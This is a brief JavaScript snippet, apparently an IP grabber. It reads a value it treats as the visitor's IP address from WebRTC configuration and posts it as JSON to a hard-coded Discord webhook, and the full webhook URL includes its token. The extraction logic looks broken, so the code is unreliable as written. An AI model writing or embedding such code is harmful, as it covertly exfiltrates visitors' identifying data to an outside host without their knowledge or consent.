var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://discord.com/api/webhooks/1121119264896725032/L9OGl4KxZkQ-iq2N7V1DjWGk7d0hM_ctxg6iEcS2NFqqK0hCcnzPPDlwBnsd0k0gJhvm');
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send(JSON.stringify({
    'ip': RTCPeerConnection().getConfiguration().iceServers[0].urls.split('@')[1]
}));
